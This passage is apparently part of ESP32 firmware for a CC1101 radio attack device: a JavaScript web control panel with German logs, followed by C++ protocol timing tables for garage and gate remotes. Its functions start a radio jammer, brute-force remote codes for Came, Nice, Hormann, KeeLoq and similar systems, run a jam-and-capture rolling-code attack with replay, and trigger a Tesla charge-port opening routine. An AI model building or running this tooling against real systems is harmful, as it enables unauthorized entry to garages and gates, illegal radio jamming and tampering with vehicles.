  const b=document.getElementById('logBox');
  if(!b)return;
  const d=new Date();
  const ts=d.getHours().toString().padStart(2,'0')+':'+
           d.getMinutes().toString().padStart(2,'0')+':'+
           d.getSeconds().toString().padStart(2,'0');
  b.innerHTML='<div>['+ts+'] '+msg+'</div>'+b.innerHTML;
  if(b.children.length>80)b.removeChild(b.lastChild);
}
function badge(id,on){
  const el=document.getElementById(id);
  if(!el)return;
  el.textContent=on?'ON':'OFF';
  el.className='badge '+(on?'on':'off');
}
function prog(fillId,textId,pct){
  const f=document.getElementById(fillId);
  const t=document.getElementById(textId);
  if(f)f.style.width=Math.min(pct,100)+'%';
  if(t)t.textContent=pct+'%';
}

// ─── STATUS AUTO-UPDATE ───────────────────────────────────────
async function getStatus(){
  const r=await api('/getstatus');
  if(!r)return;
  try{
    const d=JSON.parse(r);
    // Header
    document.getElementById('hFreq').textContent=d.freq;
    document.getElementById('hRSSI').textContent=d.rssi;
    document.getElementById('hMode').textContent=d.mode;
    document.getElementById('hUp').textContent=d.system?.uptime||'-';
    document.getElementById('hIP').textContent=d.wifi?.ip||'-';
    // Config Tab Stats
    document.getElementById('sRSSI').textContent=d.rssi;
    document.getElementById('sSNR').textContent=d.snr||'-';
    document.getElementById('sNoise').textContent=d.noise||'-';
    document.getElementById('sMode').textContent=d.mode;
    document.getElementById('sTX').textContent=d.stats?.tx||0;
    document.getElementById('sRX').textContent=d.stats?.rx||0;
    document.getElementById('sPeak').textContent=d.peakRSSI||'-';
    document.getElementById('sPeakF').textContent=d.peakFreq||'-';
    if(d.system){
      const kb=Math.round(d.system.freeRAM/1024);
      document.getElementById('sRAM').textContent=kb+'KB';
      document.getElementById('sUptime').textContent=d.system.uptime;
    }
    document.getElementById('fCount').textContent=d.buffers?.frames||0;
    document.getElementById('recFrames').textContent=d.buffers?.frames||0;
    // RSSI Visualisierung
    if(d.rssi){
      const barW=Math.max(0,Math.min(100,(d.rssi+100)*100/80));
      const color=d.rssi>-60?'#22c55e':d.rssi>-80?'#f59e0b':'#ef4444';
      document.getElementById('rxRSSI').textContent=d.rssi;
    }
    // Brute Status in Header
    if(d.brute&&d.brute.running){
      badge('bSt',true);
    }
  }catch(e){}
}
setInterval(getStatus,2000);

// ─── CONFIG TAB ───────────────────────────────────────────────
async function setFreq(){
  const f=document.getElementById('freq').value;
  await api('/setfreq?freq='+f);
  log('📻 Freq: '+f+' MHz');
}
async function setMod(){
  const m=document.getElementById('mod').value;
  await api('/setmod?mod='+m);
  log('📻 Mod: '+['2FSK','GFSK','ASK/OOK','4FSK','MSK'][m]);
}
async function setPow(){
  const p=document.getElementById('power').value;
  await api('/setpower?power='+p);
  log('📻 Power: '+p+' dBm');
}
async function setDev(){
  const d=document.getElementById('dev').value;
  await api('/setdev?dev='+d);
  log('📻 Dev: '+d+' kHz');
}
async function setDrate(){
  const d=document.getElementById('drate').value;
  await api('/setdrate?drate='+d);
  log('📻 DataRate: '+d+' kBaud');
}
async function setRxBW(){
  const b=document.getElementById('rxbw').value;
  await api('/setrxbw?rxbw='+b);
  log('📻 RxBW: '+b+' kHz');
}
async function setCh(){
  const c=document.getElementById('ch').value;
  await api('/setch?ch='+c);
  log('📻 Channel: '+c);
}
async function setSyncMode(){
  const s=document.getElementById('syncmode').value;
  await api('/setsyncmode?syncmode='+s);
  log('📻 SyncMode: '+s);
}
async function setSyncWord(){
  const h=document.getElementById('synch').value;
  const l=document.getElementById('syncl').value;
  await api('/setsyncwordh?syncwordh='+h);
  await api('/setsyncwordl?syncwordl='+l);
  log('📻 SyncWord: '+h+'/'+l);
}
async function setPktFmt(){
  await api('/setpktformat?pktformat='+document.getElementById('pktfmt').value);
}
async function setLenCfg(){
  await api('/setlengthconfig?lencfg='+document.getElementById('lencfg').value);
}
async function setManch(){
  await api('/setmanchester?manch='+document.getElementById('manch').value);
}
async function setFEC(){
  await api('/setfec?fec='+document.getElementById('fec').value);
}
async function setCRC(){
  await api('/setcrc?crc='+document.getElementById('crc').value);
}
async function setWhite(){
  await api('/setwhitedata?white='+document.getElementById('white').value);
}
async function setDCF(){
  await api('/setdcfilter?dcf='+document.getElementById('dcf').value);
}
async function qFreq(f){
  document.getElementById('freq').value=f;
  await api('/setfreq?freq='+f);
  log('⚡ Quick: '+f+' MHz');
}
async function calibrate(){
  const r=await api('/calibrate');
  if(r){
    try{const d=JSON.parse(r);log('🎯 Kalibriert: Noise='+d.noise+' dBm');}catch(e){}
  }
}
async function saveConfig(){
  await api('/saveconfig');
  log('💾 Konfiguration gespeichert');
}
async function initCC(){
  await api('/init');
  log('🔄 CC1101 neu initialisiert');
}
async function stopAll(){
  await api('/stopall');
  badge('bSt',false);badge('rlSt',false);badge('jamSt',false);badge('jamSt2',false);
  clearInterval(bTimer);clearInterval(rlTimer);clearInterval(stbTimer);
  log('⏹ ALLE OPERATIONEN GESTOPPT');
}

// ─── RX/TX TAB ───────────────────────────────────────────────
async function startRX(){
  await api('/rx');
  badge('rxBadge',true);
  log('📥 RX gestartet @ '+document.getElementById('freq').value+' MHz');
}
async function stopRX(){
  await api('/rx');
  badge('rxBadge',false);
  log('⏹ RX gestoppt');
}
async function getData(){
  const r=await api('/getdata');
  if(r&&r!=='NONE'){
    document.getElementById('lastData').textContent=r;
    document.getElementById('rxLen').textContent=Math.floor(r.replace(/\s/g,'').length/2);
    log('📥 Empfangen: '+r);
  } else {
    log('📭 Keine Daten');
  }
}
async function sendData(){
  const hex=document.getElementById('txData').value.trim();
  const rep=parseInt(document.getElementById('txRep').value)||1;
  const del=parseInt(document.getElementById('txDel').value)||0;
  if(!hex){log('❌ Keine Daten!');return;}
  for(let i=0;i<rep;i++){
    await api('/tx?data='+hex);
    if(del>0)await new Promise(r=>setTimeout(r,del));
  }
  log('📤 TX: '+hex+' x'+rep);
}
async function sendPreset(hex){
  await api('/tx?data='+hex);
  log('📤 Preset: '+hex);
}
async function startREC(){
  await api('/rec');
  badge('recBadge',true);
  log('⏺ Recording gestartet');
}
async function stopREC(){
  await api('/rec');
  badge('recBadge',false);
  log('⏹ Recording gestoppt');
}

// ─── FRAMES TAB ──────────────────────────────────────────────
async function loadFrames(){
  const r=await api('/getframes');
  if(!r)return;
  try{
    const frames=JSON.parse(r);
    document.getElementById('fCount').textContent=frames.length;
    const div=document.getElementById('frameList');
    if(!frames.length){
      div.innerHTML='<p style="text-align:center;color:#475569;padding:15px">Keine Frames</p>';
      return;
    }
    div.innerHTML='';
    frames.forEach((f,i)=>{
      const conf=f.confidence||0;
      const confColor=conf>70?'#22c55e':conf>40?'#f59e0b':'#ef4444';
      div.innerHTML+=
        '<div class="frame-item">'+
        '<strong style="color:#60a5fa">#'+i+'</strong> '+
        f.hex.substring(0,30)+(f.hex.length>30?'...':'')+
        ' <span style="color:#64748b">'+f.length+'B '+f.rssi+'dBm '+f.freq+'MHz</span>'+
        (f.protocol?'<span style="color:'+confColor+';margin-left:4px">'+
          f.protocol+' ('+conf+'%)</span>':'')+
        '<span style="float:right;display:flex;gap:4px">'+
        '<button style="padding:2px 6px;font-size:0.68rem" onclick="viewFrame('+i+')">👁</button>'+
        '<button style="padding:2px 6px;font-size:0.68rem" onclick="replayFrameIdx('+i+')">📤</button>'+
        '<button style="padding:2px 6px;font-size:0.68rem" onclick="analyzeFrameIdx('+i+')">🔍</button>'+
        '<button style="padding:2px 6px;font-size:0.68rem;background:#991b1b" onclick="delFrame('+i+')">🗑</button>'+
        '</span></div>';
    });
    log('🗂️ '+frames.length+' Frames geladen');
  }catch(e){log('❌ Frames Fehler');}
}

async function manualSend() {
  const hex=document.getElementById('manHex').value.trim();
  const freq=document.getElementById('manFreq').value;
  const mod=document.getElementById('manMod').value;
  const rep=document.getElementById('manRep').value;
  const del=document.getElementById('manDel').value;
  if(!hex){log('Keine HEX-Daten!');return;}
  const r=await api(`/manualtx?data=${hex}&freq=${freq}&mod=${mod}&repeat=${rep}&delay=${del}`);
  if(r) log('Manual TX: '+r);
}

// ─── RAW TAB ─────────────────────────────────────────────────
async function rawRX(){
  await api('/rawrx');
  badge('rawSt',true);
  log('⚡ RAW RX gestartet');
}
async function rawREC(){
  await api('/rawrec');
  badge('rawSt',true);
  log('⏺ RAW REC gestartet');
}
async function rawStop(){
  await api('/rawstop');
  badge('rawSt',false);
  log('⏹ RAW gestoppt');
}
async function getRaw(){
  const r=await api('/getrawdata');
  if(r&&r.length>0){
    document.getElementById('rawDisp').value=r;
    const bytes=Math.round(r.replace(/\s/g,'').length/2);
    document.getElementById('rawBytes').textContent=bytes;
    log('📋 RAW: '+bytes+' Bytes geladen');
  } else { log('📭 RAW Buffer leer'); }
}
async function clearRaw(){
  await api('/clearrawbuffer');
  document.getElementById('rawDisp').value='';
  document.getElementById('rawBytes').textContent='0';
  log('🗑️ RAW Buffer gelöscht');
}
function exportRaw(){
  const txt=document.getElementById('rawDisp').value;
  if(!txt){log('❌ Kein RAW Inhalt');return;}
  const blob=new Blob([txt],{type:'text/plain'});
  const a=document.createElement('a');
  a.href=URL.createObjectURL(blob);
  a.download='raw_'+Date.now()+'.txt';
  a.click();
  log('💾 RAW exportiert');
}

// ─── SCAN TAB ─────────────────────────────────────────────────
let scanInterval=null;
async function startScan(){
  if(scanRun){log('⚠️ Scan läuft schon');return;}
  const start=parseFloat(document.getElementById('scStart').value)||433.0;
  const stop=parseFloat(document.getElementById('scStop').value)||434.0;
  if(start>=stop){log('❌ Start muss < Stop sein');return;}
  scanRun=true; bestFreq=start; bestRSSI=-120;
  const totalSteps=Math.round((stop-start)/0.01);
  let step=0;
  log('📶 Scan: '+start+'–'+stop+' MHz ('+totalSteps+' Schritte)');
  clearInterval(scanInterval);
  scanInterval=setInterval(async()=>{
    if(!scanRun){clearInterval(scanInterval);return;}
    const r=await api('/scanstep?start='+start+'&stop='+stop);
    if(!r){clearInterval(scanInterval);scanRun=false;return;}
    try{
      const d=JSON.parse(r);
      step++;
      const pct=Math.min(100,Math.round(step/totalSteps*100));
      prog('scPF','scPT',pct);
      document.getElementById('scCur').textContent=d.freq+' MHz | '+d.rssi+' dBm';
      document.getElementById('scBestF').textContent=d.bestFreq;
      document.getElementById('scBestR').textContent=d.best;
      bestFreq=parseFloat(d.bestFreq); bestRSSI=parseInt(d.best);
      if(d.complete){
        clearInterval(scanInterval); scanRun=false;
        prog('scPF','scPT',100);
        log('✅ Scan fertig. Best: '+d.bestFreq+' MHz @ '+d.best+' dBm');
      }
    }catch(e){}
  },80);
}
function stopScan(){
  scanRun=false; clearInterval(scanInterval);
  log('⏹ Scan gestoppt');
}
function applyBestFreq(){
  if(bestFreq){
    document.getElementById('freq').value=bestFreq.toFixed(2);
    api('/setfreq?freq='+bestFreq.toFixed(2));
    log('✅ Freq gesetzt: '+bestFreq.toFixed(2)+' MHz');
  }
}
async function runSpectrum(){
  const start=parseFloat(document.getElementById('spStart').value)||433.0;
  const stop=parseFloat(document.getElementById('spStop').value)||434.0;
  log('📊 Spektrum: '+start+'–'+stop+' MHz...');
  document.getElementById('spInfo').textContent='Berechne...';
  const r=await api('/spectrum?start='+start+'&stop='+stop);
  if(!r){log('❌ Spektrum fehlgeschlagen');return;}
  try{
    const d=JSON.parse(r);
    const pts=d.data; // C++ gibt {"data":[...]} zurück
    if(!pts||!pts.length){log('❌ Keine Spektrumdaten');return;}
    let peakRSSI=pts[0],peakIdx=0;
    pts.forEach((v,i)=>{if(v>peakRSSI){peakRSSI=v;peakIdx=i;}});
    const peakFreq=(start+peakIdx*(stop-start)/pts.length).toFixed(2);
    drawSpectrum(pts,start,stop);
    document.getElementById('spInfo').textContent=
      'Peak: '+peakRSSI+' dBm @ '+peakFreq+' MHz | '+pts.length+' Punkte';
    log('📊 Spektrum. Peak: '+peakRSSI+' dBm @ '+peakFreq+' MHz');
  }catch(e){log('❌ Spektrum Fehler: '+e);}
}
function drawSpectrum(pts,start,stop){
  const canvas=document.getElementById('spCanvas');
  const ctx=canvas.getContext('2d');
  const W=canvas.offsetWidth||500,H=140;
  canvas.width=W; canvas.height=H;
  ctx.fillStyle='#0f172a'; ctx.fillRect(0,0,W,H);
  const minR=-110,maxR=-20,rng=maxR-minR;
  ctx.strokeStyle='#1e3a5f'; ctx.lineWidth=1;
  for(let v=-110;v<=-20;v+=10){
    const y=H-(v-minR)/rng*H;
    ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(W,y); ctx.stroke();
    ctx.fillStyle='#334155'; ctx.font='9px monospace';
    ctx.fillText(v+'dB',2,y-2);
  }
  ctx.beginPath(); ctx.strokeStyle='#60a5fa'; ctx.lineWidth=2;
  pts.forEach((rssi,i)=>{
    const x=i/(pts.length-1)*W;
    const y=H-Math.max(0,Math.min(H,(rssi-minR)/rng*H));
    i===0?ctx.moveTo(x,y):ctx.lineTo(x,y);
  });
  ctx.stroke();
  ctx.fillStyle='rgba(29,78,216,0.25)';
  ctx.beginPath();
  pts.forEach((rssi,i)=>{
    const x=i/(pts.length-1)*W;
    const y=H-Math.max(0,Math.min(H,(rssi-minR)/rng*H));
    i===0?ctx.moveTo(x,H):ctx.lineTo(x,y);
  });
  ctx.lineTo(W,H); ctx.closePath(); ctx.fill();
}

// ─── FRAMES TAB ──────────────────────────────────────────────
async function viewFrame(idx){
  const r=await api('/getframe?idx='+idx);
  if(!r)return;
  try{
    const f=JSON.parse(r);
    document.getElementById('frameDetail').textContent=
      'Frame #'+idx+'\nHEX:       '+f.hex+
      '\nLänge:     '+f.length+' Bytes\nRSSI:      '+f.rssi+' dBm'+
      '\nFreq:      '+f.freq+' MHz\nProtokoll: '+f.protocol+' ('+f.confidence+'%)'+
      '\nCode:      0x'+Number(f.code).toString(16).toUpperCase()+' ('+f.bits+' Bit)'+
      '\nTimestamp: '+f.timestamp+' ms';
    log('👁️ Frame #'+idx+': '+f.protocol+' '+f.length+'B');
  }catch(e){log('❌ Frame Details Fehler');}
}
async function replayFrameIdx(idx){
  await api('/replayframe?idx='+idx+'&repeat=5&delay=100');
  log('📤 Frame #'+idx+' gesendet x5');
}
async function replayFrame(){
  const idx=document.getElementById('rpIdx').value||0;
  const rep=document.getElementById('rpRep').value||5;
  const del=document.getElementById('rpDel').value||100;
  const r=await api('/replayframe?idx='+idx+'&repeat='+rep+'&delay='+del);
  if(r)log('📤 Frame #'+idx+' x'+rep+' @ '+del+'ms | '+r);
  await viewFrame(idx);
}
async function replayAll(){
  const r=await api('/replayall');
  if(r)log('📤 Alle Frames: '+r);
}
async function analyzeLastFrame(){
  const r=await api('/analyze');
  if(!r)return;
  try{
    const d=JSON.parse(r);
    document.getElementById('analyzeRes').textContent=
      'Protokoll: '+d.protocol+' | Code: 0x'+Number(d.code).toString(16).toUpperCase()+
      ' | '+d.bits+' Bit | Konfidenz: '+d.confidence+'%';
    log('🔍 '+d.protocol+' 0x'+Number(d.code).toString(16).toUpperCase()+' ('+d.confidence+'%)');
  }catch(e){}
}
async function analyzeFrameIdx(idx){
  const r=await api('/analyzeframe?frame='+idx);
  if(!r)return;
  try{
    const d=JSON.parse(r);
    document.getElementById('analyzeRes').textContent=
      'Frame #'+idx+' → '+d.protocol+' | Code: 0x'+Number(d.code).toString(16).toUpperCase()+
      ' | '+d.bits+' Bit | Konfidenz: '+d.confidence+'%';
    log('🔍 Frame #'+idx+': '+d.protocol);
    await viewFrame(idx);
  }catch(e){}
}
async function exportFrames(){
  const r=await api('/getframes');
  if(!r){log('❌ Keine Frames');return;}
  const blob=new Blob([r],{type:'application/json'});
  const a=document.createElement('a');
  a.href=URL.createObjectURL(blob);
  a.download='frames_'+Date.now()+'.json';
  a.click();
  log('💾 Frames exportiert');
}
async function clearFrames(){
  if(!confirm('Alle Frames löschen?'))return;
  await api('/clearframes');
  document.getElementById('frameList').innerHTML=
    '<p style="text-align:center;color:#475569;padding:15px">Keine Frames</p>';
  document.getElementById('fCount').textContent='0';
  document.getElementById('frameDetail').textContent='Frame Details erscheinen hier...';
  document.getElementById('analyzeRes').textContent='';
  log('🗑️ Alle Frames gelöscht');
}
async function delFrame(idx){
  await api('/deleteframe?idx='+idx);
  log('🗑️ Frame #'+idx+' gelöscht');
  await loadFrames();
}

// ─── BRUTE FORCE TAB ─────────────────────────────────────────
const PROTO_BITS=[24,12,24,12,12,12,12,44,64,56,10,12];
function updateBruteBits(){
  const idx=parseInt(document.getElementById('bProto').value)||0;
  document.getElementById('bBits').value=PROTO_BITS[idx]||24;
}
async function startBrute(){
  const proto=document.getElementById('bProto').value;
  const bits=document.getElementById('bBits').value;
  const start=document.getElementById('bStart').value||'0';
  const end=document.getElementById('bEnd').value||'0';
  const rep=document.getElementById('bRep').value||3;
  const del=document.getElementById('bDel').value||100;
  const r=await api('/brutestart?proto='+proto+'&bits='+bits+
                    '&start='+start+'&end='+end+'&repeat='+rep+'&delay='+del);
  if(r){
    badge('bSt',true);
    log('🔨 Brute: Proto='+proto+' Bits='+bits);
    clearInterval(bTimer); bTimer=setInterval(pollBrute,1000);
  }
}
async function pauseBrute(){
  const r=await api('/brutepause');
  if(r)log('⏸ Brute: '+(r.includes('PAUSED')?'pausiert':'fortgesetzt'));
}
async function stopBrute(){
  await api('/brutestop');
  badge('bSt',false); clearInterval(bTimer);
  prog('bPF','bPT',0);
  log('⏹ Brute gestoppt');
}
async function pollBrute(){
  const r=await api('/bruteprogress');
  if(!r)return;
  try{
    const d=JSON.parse(r);
    // C++ gibt zurück: {running, paused, current, total, speed, progress, sent}
    badge('bSt',d.running);
    if(!d.running)clearInterval(bTimer);
    prog('bPF','bPT',d.progress||0);
    document.getElementById('bCur').textContent='0x'+Number(d.current).toString(16).toUpperCase();
    document.getElementById('bTotal').textContent=(d.total||0).toLocaleString();
    document.getElementById('bSpd').textContent=(d.speed||0)+'/s';
    document.getElementById('bSent').textContent=d.sent||0;
    if(d.speed>0&&d.total>0){
      const rem=Math.round((d.total-d.current)/(d.speed||1));
      const h=Math.floor(rem/3600),m=Math.floor(rem%3600/60),s=rem%60;
      document.getElementById('bRemain').textContent=
        h.toString().padStart(2,'0')+':'+m.toString().padStart(2,'0')+':'+s.toString().padStart(2,'0');
    }
  }catch(e){}
}
async function smartBrute(){
  const frame=document.getElementById('sbFrame').value||0;
  const range=document.getElementById('sbRange').value||1000;
  const r=await api('/brutefromframe?frame='+frame+'&range='+range);
  if(r){
    badge('bSt',true);
    log('🎯 Smart Brute: Frame #'+frame+' ±'+range);
    clearInterval(bTimer); bTimer=setInterval(pollBrute,1000);
  }
}

// ─── ROLLING CODE TAB ────────────────────────────────────────
async function startRolling(){
  const freq=document.getElementById('rlFreq').value||433.92;
  const max=document.getElementById('rlMax').value||3;
  const jam=document.getElementById('rlJam').value||10000;
  const rx=document.getElementById('rlRx').value||20000;
  // C++ erwartet: freq, max, jam, rx
  const r=await api('/rollingstart?freq='+freq+'&max='+max+'&jam='+jam+'&rx='+rx);
  if(r){
    badge('rlSt',true);
    log('🎲 Rolling Code @ '+freq+' MHz, max '+max);
    clearInterval(rlTimer); rlTimer=setInterval(pollRolling,1500);
  }
}
async function stopRolling(){
  await api('/rollingstop');
  badge('rlSt',false); clearInterval(rlTimer);
  prog('rlPF','rlPT',0);
  log('⏹ Rolling gestoppt');
}
async function pollRolling(){
  const r=await api('/getrolling');
  if(!r)return;
  try{
    const d=JSON.parse(r);
    // C++ gibt zurück: {active, jamming, count, max}
    badge('rlSt',d.active);
    if(!d.active)clearInterval(rlTimer);
    const pct=d.max>0?Math.round(d.count/d.max*100):0;
    prog('rlPF','rlPT',pct);
    document.getElementById('rlCap').textContent=d.count||0;
    document.getElementById('rlPhase').textContent=d.jamming?'🔴 JAMMING':'🟢 LISTEN';
    document.getElementById('rlPT').textContent='Gefangen: '+(d.count||0)+'/'+(d.max||0);
  }catch(e){}
}
async function loadRollingCodes(){
  const r=await api('/getrollingcodes');
  if(!r)return;
  try{
    const codes=JSON.parse(r);
    const div=document.getElementById('rlCodeList');
    if(!codes||!codes.length){div.innerHTML='Keine Codes';return;}
    div.innerHTML='';
    codes.forEach((c,i)=>{
      div.innerHTML+=
        '<div style="padding:4px 6px;border:1px solid #1e3a5f;border-radius:4px;margin:3px 0;font-size:0.75rem">'+
        '<strong style="color:#60a5fa">#'+i+'</strong> '+
        (c.hex||'').substring(0,24)+
        ' <span style="color:#64748b">'+c.rssi+'dBm | '+c.protocol+' | '+c.length+'B</span>'+
        (c.replayed?'<span style="color:#f59e0b;margin-left:6px">✓ gesendet</span>':'')+
        '</div>';
    });
    log('📋 '+codes.length+' Rolling Codes geladen');
  }catch(e){log('❌ Rolling Codes Fehler');}
}
async function replayRolling(idx){
  // C++ erwartet Parameter "code" (nicht "idx")
  const r=await api('/replayrolling?code='+idx);
  if(r)log('📤 Rolling Code #'+idx+': '+r);
}

// ─── SCAN+BRUTE TAB ──────────────────────────────────────────
async function startSTB(){
  const scanStart=document.getElementById('stbS').value||433.0;
  const scanStop=document.getElementById('stbE').value||434.0;
  const protocol=document.getElementById('stbP').value||0;
  const bits=document.getElementById('stbB').value||24;
  const rep=document.getElementById('stbR').value||3;
  const del=document.getElementById('stbD').value||100;
  // C++ erwartet: scanStart, scanStop, protocol, bits, repeat, delay
  const r=await api('/stbstart?scanStart='+scanStart+'&scanStop='+scanStop+
                    '&protocol='+protocol+'&bits='+bits+'&repeat='+rep+'&delay='+del);
  if(r){
    badge('stbSt',true);
    log('🚀 Scan+Brute: '+scanStart+'–'+scanStop+' MHz');
    clearInterval(stbTimer); stbTimer=setInterval(pollSTB,1200);
  }
}
async function pauseSTB(){
  const r=await api('/stbpause');
  if(r)log('⏸ STB: '+(r.includes('PAUSED')?'pausiert':'fortgesetzt'));
}
async function stopSTB(){
  await api('/stbstop');
  badge('stbSt',false); clearInterval(stbTimer);
  prog('stbSF','stbST',0); prog('stbBF','stbBT',0);
  document.getElementById('stbPhase').textContent='Phase: IDLE';
  log('⏹ Scan+Brute gestoppt');
}
async function pollSTB(){
  const r=await api('/stbprogress');
  if(!r)return;
  try{
    const d=JSON.parse(r);
    // C++ gibt zurück: {active, phaseIdx, phase, scan:{progress,current,bestFreq,bestRSSI},
    //                   brute:{progress,current,total,speed}, topFreqs:[{freq,rssi}]}
    badge('stbSt',d.active);
    if(!d.active)clearInterval(stbTimer);
    document.getElementById('stbPhase').textContent='Phase: '+(d.phase||'?');
    prog('stbSF','stbST',d.scan?d.scan.progress:0);
    prog('stbBF','stbBT',d.brute?d.brute.progress:0);
    if(d.scan){
      document.getElementById('stbBFreq').textContent=d.scan.bestFreq||'-';
      document.getElementById('stbBRSSI').textContent=d.scan.bestRSSI||'-';
    }
    if(d.brute){
      document.getElementById('stbBCode').textContent=d.brute.current?
        '0x'+Number(d.brute.current).toString(16).toUpperCase():'-';
      document.getElementById('stbBSpd').textContent=d.brute.speed||'-';
    }
    if(d.topFreqs&&d.topFreqs.length){
      document.getElementById('stbTopFreqs').textContent=
        'Top: '+d.topFreqs.map(f=>f.freq.toFixed(2)+' ('+f.rssi+'dBm)').join(' | ');
    }
  }catch(e){}
}

// ─── ANGRIFFE TAB ────────────────────────────────────────────
async function startJam(){
  const freq=document.getElementById('jamFreqI').value||433.92;
  const mod=document.getElementById('jamMod').value||2;
  await api('/setfreq?freq='+freq);
  await api('/setmod?mod='+mod);
  const r=await api('/jam');
  if(r){badge('jamSt',true);badge('jamSt2',true);log('⚡ JAMMER AN @ '+freq+' MHz');}
}
async function stopJam(){
  await api('/stopjam');
  badge('jamSt',false);badge('jamSt2',false);
  log('⏹ JAMMER AUS');
}
async function openTesla(){
  const variant=document.getElementById('teslaVar').value||0;
  const rep=document.getElementById('teslaRep').value||10;
  const r=await api('/tesla?variant='+variant+'&repeat='+rep);
  if(r)log('🚗 Tesla Ladeport: '+r);
}
async function startOTA(){
  const fileInput=document.getElementById('otaFile');
  if(!fileInput.files.length){log('❌ Keine .bin Datei');return;}
  const file=fileInput.files[0];
  log('🔄 OTA: '+file.name+' ('+Math.round(file.size/1024)+' KB)');
  document.getElementById('otaPW').style.display='block';
  document.getElementById('otaStatus').textContent='Upload läuft...';
  const formData=new FormData();
  formData.append('update',file,file.name);
  const xhr=new XMLHttpRequest();
  xhr.open('POST','/ota',true);
  xhr.upload.onprogress=function(e){
    if(e.lengthComputable){
      const pct=Math.round(e.loaded/e.total*100);
      prog('otaPF','otaPT',pct);
      document.getElementById('otaStatus').textContent='Upload: '+pct+'%';
    }
  };
  xhr.onload=function(){
    if(xhr.status===200){
      prog('otaPF','otaPT',100);
      document.getElementById('otaStatus').textContent='✅ Flash OK! Neustart...';
      log('✅ OTA OK. Neustart...');
      setTimeout(()=>location.reload(),5000);
    }else{
      document.getElementById('otaStatus').textContent='❌ '+xhr.responseText;
      log('❌ OTA Fehler: '+xhr.responseText);
    }
  };
  xhr.onerror=function(){log('❌ OTA Verbindungsfehler');};
  xhr.send(formData);
}

// ─── WIFI TAB ────────────────────────────────────────────────
async function scanWifi(){
  log('🔍 WiFi Scan...');
  const div=document.getElementById('wifiList');
  div.innerHTML='<p style="color:#64748b;font-size:0.75rem">Suche...</p>';
  const r=await api('/wifiscan');
  if(!r){log('❌ WiFi Scan fehlgeschlagen');return;}
  try{
    const nets=JSON.parse(r);
    // C++ gibt zurück: [{ssid, rssi, encryption}]
    if(!nets.length){div.innerHTML='<p style="color:#64748b">Keine Netzwerke</p>';return;}
    div.innerHTML='';
    nets.forEach(n=>{
      const bars=n.rssi>-60?'▂▄▆█':n.rssi>-75?'▂▄▆░':n.rssi>-85?'▂▄░░':'▂░░░';
      div.innerHTML+=
        '<div class="wifi-item" onclick="document.getElementById(\'wSSIDi\').value=\''+
        n.ssid.replace(/'/g,"\\'")+'\'">'+'<strong>'+n.ssid+'</strong>'+
        ' <span style="float:right;color:#94a3b8">'+bars+' '+n.rssi+'dBm'+(n.encryption?'🔒':'')+
        '</span></div>';
    });
    log('🔍 '+nets.length+' Netzwerke');
  }catch(e){log('❌ WiFi Fehler');}
}
async function getWifiStatus(){
  const r=await api('/wifistatus');
  if(!r)return;
  try{
    const d=JSON.parse(r);
    // C++ gibt zurück: {mode, ssid, ip, wifiRssi}
    document.getElementById('wMode').textContent=d.mode||'-';
    document.getElementById('wSSID').textContent=d.ssid||'(AP Modus)';
    document.getElementById('wIP').textContent=d.ip||'-';
    document.getElementById('wRSSI').textContent=d.wifiRssi||'-';
    document.getElementById('wifiConfigInfo').textContent=
      'Modus: '+(d.mode||'?')+' | SSID: '+(d.ssid||'-')+' | IP: '+(d.ip||'?');
    log('📡 WiFi: '+(d.mode||'?')+' | '+(d.ip||'?'));
  }catch(e){log('❌ WiFi Status Fehler');}
}
async function connectWifi(){
  const ssid=document.getElementById('wSSIDi').value.trim();
  const pass=document.getElementById('wPassi').value;
  if(!ssid){log('❌ SSID fehlt');return;}
  if(!confirm('Verbinden mit "'+ssid+'"?\nESP32 startet neu!'))return;
  log('🔗 Verbinde: '+ssid);
  await api('/wificonnect?ssid='+encodeURIComponent(ssid)+'&pass='+encodeURIComponent(pass));
  log('⏳ Neustart – neue IP im Router nachschauen!');
}
async function switchAP(){
  if(!confirm('Zurück zum AP Modus?\nESP32 startet neu!'))return;
  await api('/wifiap');
  log('📡 AP Modus. Verbinde mit "CC1101_PRO"...');
}
</script>
</body>
</html>
)rawliteral";

// ═══════════════════════════════════════════════════════════════
// PROTOCOLS
// ═══════════════════════════════════════════════════════════════
struct ProtocolConfig {
  const char *name;
  uint16_t pulseShort;
  uint16_t pulseLong;
  uint16_t syncHigh;
  uint16_t syncLow;
  uint8_t preambleCount;
  uint16_t preambleHigh;
  uint16_t preambleLow;
  uint8_t encoding;
  uint8_t defaultBits;
  uint8_t defaultRepeat;
  float defaultFreq;
};

const ProtocolConfig PROTOCOLS[] = {
  { "Princeton", 350, 1050, 350, 10850, 31, 350, 350, 0, 24, 5, 433.92 },
  { "PT2262", 350, 1050, 350, 10850, 31, 350, 350, 0, 12, 5, 433.92 },
  { "EV1527", 300, 900, 300, 9300, 31, 300, 300, 0, 24, 5, 433.92 },
  { "HT12E", 450, 900, 450, 10350, 31, 450, 450, 0, 12, 5, 433.92 },
  { "Came", 320, 640, 320, 11520, 31, 320, 320, 0, 12, 5, 433.92 },
  { "Nice", 700, 1400, 700, 2800, 31, 700, 700, 0, 12, 5, 433.92 },
  { "Faac", 200, 600, 200, 9800, 31, 200, 200, 0, 12, 5, 433.92 },
  { "Hormann", 500, 1000, 500, 12000, 31, 500, 500, 0, 44, 3, 433.92 },
  { "KeeLoq", 400, 800, 400, 9600, 0, 0, 0, 0, 64, 3, 433.92 },
  { "Somfy RTS", 604, 1208, 2416, 2416, 16, 604, 604, 1, 56, 3, 433.42 },
  { "Linear", 500, 1500, 500, 10000, 31, 500, 500, 0, 10, 5, 310.00 },
  { "Custom", 400, 800, 400, 9600, 0, 0, 0, 0, 12, 5, 433.92 }
};
const int PROTOCOL_COUNT = 12;

// ═══════════════════════════════════════════════════════════════
// SYSTEM MODE & DISPLAY MODE
// ═══════════════════════════════════════════════════════════════
enum SystemMode {
  MODE_IDLE = 0,
  MODE_RX = 1,
  MODE_REC = 2,
  MODE_JAM = 3,
  MODE_RAW_RX = 4,
  MODE_RAW_REC = 5,
  MODE_BRUTE = 6,
  MODE_SCAN = 7,
  MODE_SPECTRUM = 8,
  MODE_ROLLING_JAM = 9,
  MODE_STB_SCAN = 10,
  MODE_STB_BRUTE = 11,
  MODE_OTA = 12
};

enum DisplayMode {
  DISP_IDLE = 0,
  DISP_RX = 1,
  DISP_BRUTE = 2,
  DISP_SCAN = 3,
  DISP_JAM = 4,
  DISP_ROLLING = 5,
  DISP_STB = 6,
  DISP_SPECTRUM = 7,
  DISP_OTA = 8,
  DISP_STATS = 9
};

SystemMode currentMode = MODE_IDLE;

